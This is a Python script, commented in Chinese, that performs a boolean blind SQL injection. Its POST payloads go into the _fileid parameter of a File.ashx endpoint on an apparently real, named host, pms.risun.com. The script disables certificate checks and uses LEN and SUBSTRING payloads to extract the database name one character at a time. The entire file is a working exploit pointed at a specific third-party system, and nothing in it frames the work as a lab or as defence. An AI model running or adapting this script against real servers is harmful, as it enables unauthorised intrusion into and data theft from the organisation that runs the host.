import requests
import string
import time
import urllib3

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def boolean_blind_injection(target_url):
    """
    通过布尔盲注获取数据库名称
    """
    # 字符集：小写字母、数字和常见特殊字符
    charset = string.ascii_lowercase + string.digits + "_"+"~"+"$"+"@"
    
    db_name = ""
    position = 1
    max_length = 30  # 假设数据库名称最大长度为30
    
    print(f"开始对 {target_url} 进行布尔盲注...")
    print("字符集:", charset)
    print("-" * 50)
    
    # 首先确定数据库名称的长度
    print("确定数据库名称长度...")
    db_length = None
    for length in range(1, max_length + 1):
        payload = f"1' AND LEN(db_name())={length} --"
        if send_request(target_url, payload):
            db_length = length
            print(f"数据库名称长度为: {length}")
            break
    
    if db_length is None:
        print("无法确定数据库名称长度，使用默认最大长度")
        db_length = max_length
    
    # 逐个字符获取数据库名称
    print("获取数据库名称...")
    for position in range(1, db_length + 1):
        char_found = False
        
        for char in charset:
            payload = f"1' AND SUBSTRING(db_name(),{position},1)='{char}' --"
            
            if send_request(target_url, payload):
                db_name += char
                print(f"位置 {position}: '{char}' - 数据库名称: {db_name}")
                char_found = True
                break
        
        # 如果当前位置没有找到任何字符，可能是名称结束或包含不在字符集中的字符
        if not char_found:
            print(f"位置 {position}: 未找到匹配字符，数据库名称可能包含特殊字符")
            # 尝试大写字母
            for char in string.ascii_uppercase:
                payload = f"1' AND SUBSTRING(db_name(),{position},1)='{char}' --"
                
                if send_request(target_url, payload):
                    db_name += char
                    print(f"位置 {position}: '{char}' - 数据库名称: {db_name}")
                    char_found = True
                    break
            
            if not char_found:
                print(f"位置 {position}: 未找到任何匹配字符，停止注入")
                break
        
        # 添加延迟避免请求过快
        time.sleep(0.1)
    
    return db_name

def send_request(target_url, payload):
    """
    发送注入请求并检查响应
    """
    # 构造POST数据
    post_data = f"NoCheckSession=true&ServerOperatorType=OpenRecord&_fileid={payload}&_type=ftp&action=topdf&sessionid=1"
    
    # 请求头
    headers = {
        "Host": target_url.split("//")[1].split("/")[0],
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": str(len(post_data))
    }
    
    try:
        # 发送POST请求
        response = requests.post(
            target_url,
            data=post_data,
            headers=headers,
            timeout=10,
            verify=False
        )
        
        # 检查响应中是否包含"uniqueidentifier"关键词
        if "uniqueidentifier" in response.text:
            return True
        else:
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"请求失败: {e}")
        return False

def main():
    """
    主函数
    """
    # 目标URL
    target_url = "http://pms.risun.com:8081/PowerPlat/Control/File.ashx"
    
    print("SQL注入数据库名称获取工具")
    print("=" * 50)
    
    # 获取数据库名称
    db_name = boolean_blind_injection(target_url)
    
    print("=" * 50)
    if db_name:
        print(f"成功获取数据库名称: {db_name}")
    else:
        print("未能获取数据库名称")

if __name__ == "__main__":
    main()